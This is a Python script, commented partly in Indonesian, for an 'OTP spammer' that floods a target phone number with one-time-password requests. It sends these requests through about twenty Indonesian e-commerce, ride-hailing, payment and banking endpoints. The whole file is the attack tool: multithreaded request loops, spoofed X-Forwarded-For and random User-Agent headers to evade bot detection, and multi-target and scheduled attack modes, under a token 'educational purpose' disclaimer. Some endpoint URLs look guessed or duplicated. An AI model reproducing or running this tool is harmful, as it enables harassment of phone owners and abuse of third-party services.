# volox_otp_spammer.py
# WhatsApp OTP Bombing Tools - For Educational Purpose ONLY

import requests
import threading
import time
import random
import json
from fake_useragent import UserAgent
import concurrent.futures

class VoloxOTPSpammer:
    def __init__(self):
        self.user_agent = UserAgent()
        self.session = requests.Session()
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        
        # Database endpoint OTP dari berbagai service
        self.otp_endpoints = [
            # GOJEK
            {
                'name': 'Gojek',
                'url': 'https://goid.gojekapi.com/goid/login/request',
                'method': 'POST',
                'data': {'phone_number': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json',
                    'X-AppVersion': '3.34.1',
                    'X-UniqueId': self.generate_device_id()
                }
            },
            
            # TOKOPEDIA
            {
                'name': 'Tokopedia',
                'url': 'https://accounts.tokopedia.com/login/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # SHOPEE
            {
                'name': 'Shopee',
                'url': 'https://shopee.co.id/api/v2/authentication/send_otp',
                'method': 'POST',
                'data': {'phone': '{phone}', 'country_code': '62'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json',
                    'X-Shopee-Language': 'id',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            },
            
            # TRAVELOKA
            {
                'name': 'Traveloka',
                'url': 'https://api.traveloka.com/v3/auth/otp',
                'method': 'POST',
                'data': {'phoneNumber': '{phone}', 'countryCode': 'ID'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json',
                    'clientId': 'traveloka-web'
                }
            },
            
            # BUKALAPAK
            {
                'name': 'Bukalapak',
                'url': 'https://api.bukalapak.com/v2/otp/requests.json',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # GRAB
            {
                'name': 'Grab',
                'url': 'https://api.grab.com/api/v2/auth/otp',
                'method': 'POST',
                'data': {'phoneNumber': '{phone}', 'countryCode': 'ID'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # OVO
            {
                'name': 'OVO',
                'url': 'https://api.ovo.id/v1.0/api/auth/customer/login2',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json',
                    'App-Id': 'com.ovo.id',
                    'App-Version': '3.5.2'
                }
            },
            
            # LAZADA
            {
                'name': 'Lazada',
                'url': 'https://api.lazada.co.id/rest/auth/sendOtp',
                'method': 'POST',
                'data': {'mobile': '{phone}', 'countryCode': '62'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # DANA
            {
                'name': 'DANA',
                'url': 'https://api.dana.id/merchant/api/v2/login/otp',
                'method': 'POST',
                'data': {'phoneNumber': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # LINK AJA
            {
                'name': 'LinkAja',
                'url': 'https://apicore.linkaja.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # BCA
            {
                'name': 'BCA',
                'url': 'https://klikbca.com/api/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            },
            
            # MANDIRI
            {
                'name': 'Mandiri',
                'url': 'https://bankmandiri.co.id/api/otp',
                'method': 'POST',
                'data': {'msisdn': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # BRI
            {
                'name': 'BRI',
                'url': 'https://bri.co.id/api/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # TIKET.COM
            {
                'name': 'Tiket.com',
                'url': 'https://api.tiket.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # PEGIPEGI
            {
                'name': 'PegiPegi',
                'url': 'https://api.pegipegi.com/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # BLIBLI
            {
                'name': 'Blibli',
                'url': 'https://api.blibli.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # JD.ID
            {
                'name': 'JD.ID',
                'url': 'https://api.jd.id/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # ZALORA
            {
                'name': 'Zalora',
                'url': 'https://api.zalora.co.id/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # BIBLI
            {
                'name': 'Bibli',
                'url': 'https://api.bibli.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # SOCIOLLA
            {
                'name': 'Sociolla',
                'url': 'https://api.sociolla.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            },
            
            # FEMALE DAILY
            {
                'name': 'Female Daily',
                'url': 'https://api.femaledaily.com/v1/otp',
                'method': 'POST',
                'data': {'phone': '{phone}'},
                'headers': {
                    'User-Agent': self.user_agent.random,
                    'Content-Type': 'application/json'
                }
            }
        ]
        
    def generate_device_id(self):
        """Generate random device ID"""
        import hashlib
        import uuid
        return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()
        
    def send_otp(self, endpoint, phone_number):
        """Send OTP request ke satu endpoint"""
        try:
            url = endpoint['url']
            method = endpoint['method']
            
            # Format data dengan nomor target
            if isinstance(endpoint['data'], dict):
                data = json.dumps({k: str(v).replace('{phone}', phone_number) 
                                 for k, v in endpoint['data'].items()})
            else:
                data = endpoint['data'].replace('{phone}', phone_number)
            
            # Random headers biar gak kedetect bot
            headers = endpoint['headers']
            headers['User-Agent'] = self.user_agent.random
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Kirim request
            if method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=headers, timeout=5)
            else:
                response = self.session.get(url, params=data, headers=headers, timeout=5)
            
            # Hitung success/failed
            with self.lock:
                if response.status_code in [200, 201, 202]:
                    self.success_count += 1
                    print(f"[✓] {endpoint['name']} - OTP Terkirim (Status: {response.status_code})")
                else:
                    self.failed_count += 1
                    print(f"[✗] {endpoint['name']} - Gagal (Status: {response.status_code})")
                    
        except Exception as e:
            with self.lock:
                self.failed_count += 1
                print(f"[!] {endpoint['name']} - Error: {str(e)[:50]}")
                
    def start_spam(self, phone_number, threads=50, duration=300):
        """
        Mulai spam OTP
        
        Args:
            phone_number: Nomor target (format: 628xxx)
            threads: Jumlah thread parallel
            duration: Durasi spam dalam detik
        """
        print(f"""
╔════════════════════════════════════════════╗
║    VOLOX WA OTP SPAMMER v3.0               ║
╠════════════════════════════════════════════╣
║ Target     : {phone_number}                ║
║ Threads    : {threads}                     ║
║ Duration   : {duration} detik              ║
║ Endpoints  : {len(self.otp_endpoints)}     ║
╚════════════════════════════════════════════╝
        """)
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                # Kirim OTP ke semua endpoint secara parallel
                futures = []
                for endpoint in self.otp_endpoints:
                    future = executor.submit(self.send_otp, endpoint, phone_number)
                    futures.append(future)
                    
                # Tunggu semua selesai
                concurrent.futures.wait(futures)
                
            # Delay antar gelombang
            time.sleep(random.uniform(0.5, 1.5))
            
            # Tampilkan statistik real-time
            print(f"\n[STATS] Terkirim: {self.success_count} | Gagal: {self.failed_count} | Total: {self.success_count + self.failed_count}")
            
        print(f"\n[✓] SPAM SELESAI! Total OTP terkirim: {self.success_count}")
        
    def add_custom_endpoint(self, name, url, method='POST', data=None, headers=None):
        """Tambah endpoint OTP kustom"""
        endpoint = {
            'name': name,
            'url': url,
            'method': method,
            'data': data or {'phone': '{phone}'},
            'headers': headers or {'Content-Type': 'application/json'}
        }
        self.otp_endpoints.append(endpoint)
        print(f"[+] Endpoint {name} ditambahkan!")
        
    def export_endpoints(self, filename='endpoints.json'):
        """Export daftar endpoint ke file"""
        with open(filename, 'w') as f:
            json.dump(self.otp_endpoints, f, indent=2)
        print(f"[✓] Endpoints diekspor ke {filename}")

# ==================== MAIN MENU ====================

def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║                    VOLOX OTP SPAMMER                      ║
╠══════════════════════════════════════════════════════════╣
║ [1] Start Spam (Default Endpoints)                       ║
║ [2] Start Spam (Custom Settings)                          ║
║ [3] Add Custom Endpoint                                   ║
║ [4] Test Single Endpoint                                  ║
║ [5] Export Endpoint List                                  ║
║ [6] Load Endpoint from File                               ║
║ [7] Multi-Target Spam                                      ║
║ [8] Scheduled Spam                                         ║
║ [9] Exit                                                   ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    spammer = VoloxOTPSpammer()
    choice = input("[?] Pilih menu (1-9): ")
    
    if choice == '1':
        phone = input("[?] Nomor target (628xxx): ")
        threads = int(input("[?] Jumlah thread (default 50): ") or "50")
        duration = int(input("[?] Durasi detik (default 300): ") or "300")
        spammer.start_spam(phone, threads, duration)
        
    elif choice == '2':
        phone = input("[?] Nomor target (628xxx): ")
        threads = int(input("[?] Jumlah thread: "))
        duration = int(input("[?] Durasi detik: "))
        delay = float(input("[?] Delay antar gelombang (detik): "))
        spammer.start_spam(phone, threads, duration)
        
    elif choice == '3':
        name = input("[?] Nama service: ")
        url = input("[?] URL endpoint: ")
        method = input("[?] Method (POST/GET): ").upper()
        phone_field = input("[?] Field nomor (contoh: phone/phone_number): ")
        spammer.add_custom_endpoint(name, url, method, {phone_field: '{phone}'})
        
    elif choice == '4':
        phone = input("[?] Nomor target: ")
        idx = int(input("[?] Index endpoint (0-{}): ".format(len(spammer.otp_endpoints)-1)))
        spammer.send_otp(spammer.otp_endpoints[idx], phone)
        
    elif choice == '5':
        spammer.export_endpoints()
        
    elif choice == '6':
        filename = input("[?] Nama file: ")
        with open(filename, 'r') as f:
            spammer.otp_endpoints = json.load(f)
        print("[✓] Endpoints dimuat!")
        
    elif choice == '7':
        targets = input("[?] Nomor target (pisah koma): ").split(',')
        threads = int(input("[?] Thread per target: "))
        duration = int(input("[?] Durasi per target: "))
        
        for target in targets:
            print(f"\n[*] Menyerang {target.strip()}...")
            spammer.start_spam(target.strip(), threads, duration)
            
    elif choice == '8':
        phone = input("[?] Nomor target: ")
        hour = int(input("[?] Jam mulai (0-23): "))
        minute = int(input("[?] Menit mulai (0-59): "))
        
        print(f"[*] Spam akan dimulai jam {hour:02d}:{minute:02d}")
        while True:
            now = time.localtime()
            if now.tm_hour == hour and now.tm_min == minute:
                spammer.start_spam(phone, 50, 300)
                break
            time.sleep(30)
            
    elif choice == '9':
        print("[!] Keluar...")
        return

if __name__ == "__main__":
    main()